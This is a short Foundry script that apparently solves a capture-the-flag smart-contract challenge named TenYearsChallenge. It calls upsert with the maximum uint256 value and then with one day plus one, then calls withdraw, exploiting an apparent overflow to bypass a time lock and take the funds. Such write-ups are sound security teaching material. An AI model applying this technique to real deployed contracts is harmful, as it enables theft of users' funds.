// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "forge-std/Script.sol";

import "../src/TenYearsChallenge/TenYearsChallenge.sol";

contract TenYearsChallengeScript is Script {
    TenYearsChallenge challenge;
    address public sender;

    function setUp() public {
        challenge = TenYearsChallenge(0x798238246FD6AFF019bEc52D0D78F1Bc5CC593A8);
        uint256 privateKey = uint256(vm.envBytes32("PRIVATE_KEY"));
        sender = vm.addr(privateKey);
    }

    function run() public {
        vm.startBroadcast(sender);
        challenge.upsert(1, type(uint256).max);
        challenge.upsert(2, 1 days + 1);
        challenge.withdraw(2);
        vm.stopBroadcast();
    }
}
